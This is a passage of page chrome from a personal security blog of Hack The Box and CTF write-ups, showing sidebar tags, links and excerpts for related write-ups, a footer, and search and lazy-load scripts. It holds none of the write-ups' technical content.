href="/posts/XMAS_CTF-GnomeArena/">X-MAS CTF: GnomeArena: Rock Paper Scissors</a></li><li><a href="/posts/Writeup/">Hack The Box: Writeup write-up</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a> <a class="post-tag" href="/tags/rsa/">RSA</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Haystack/" class="btn btn-outline-primary"><p>Hack The Box: Haystack write-up</p></a> <a href="/posts/Safe/" class="btn btn-outline-primary"><p>Hack The Box: Safe write-up</p></a></div><!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Writeup/"><div class="card-body"> <span class="timeago small"> Jun 19, 2019 <i class="unloaded">2019-06-19T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Writeup write-up</h3><div class="text-muted small"><p>Hack The Box: Writeup machine write-up This machine with fun name was interesting in the sense that it taught me that recon needs to be done on google looking for existing exploits, as sometimes m...</p></div></div></a></div><div class="card"> <a href="/posts/Jarvis/"><div class="card-body"> <span class="timeago small"> Jul 4, 2019 <i class="unloaded">2019-07-04T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Jarvis write-up</h3><div class="text-muted small"><p>Hack The Box: Jarvis machine write-up Jarvis was one of the funniest and most interesting machines I’ve done so far. I learned a lot from it. It starts with a SQL injection that can be exploited t...</p></div></div></a></div><div class="card"> <a href="/posts/Haystack/"><div class="card-body"> <span class="timeago small"> Jul 11, 2019 <i class="unloaded">2019-07-11T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Haystack write-up</h3><div class="text-muted small"><p>Hack The Box: Haystack machine write-up Although rated as easy, this machine could have perfectly been a medium machine. It is all based around the ELK stack: Elasticsearch - Logstash - Kibana, wh...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js" crossorigin="anonymous"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/secfaults">Diego Bernal Adelantado</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a> <a class="post-tag" href="/tags/rsa/">RSA</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
